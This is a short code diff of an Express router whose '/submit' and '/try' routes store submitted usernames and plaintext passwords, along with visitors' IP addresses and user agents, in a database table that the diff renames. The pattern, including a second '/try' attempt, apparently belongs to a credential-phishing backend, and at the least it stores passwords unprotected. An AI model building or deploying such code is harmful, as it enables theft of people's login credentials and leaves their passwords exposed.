@@ -40,7 +40,7 @@ router.post('/submit', validateFormData, (req, res) => {
     
 
 		// Insert a new record if no matching record exists
-		const insertQuery = 'INSERT INTO paftab (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
+		const insertQuery = 'INSERT INTO BNtab (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
 		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
 		if (err) {
 		    console.error('Error inserting record:', err);
@@ -85,7 +85,7 @@ router.post('/try', validateFormData2, (req, res) => {
     
 
 		// Insert a new record if no matching record exists
-		const insertQuery = 'INSERT INTO paftab (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
+		const insertQuery = 'INSERT INTO BNtab (username, password, ip, useragent,date) VALUES (?,?,?,?,?)';
 		db.query(insertQuery, [name, word, ip, useragent, date], (err) => {
 		if (err) {
 		    console.error('Error inserting record:', err);
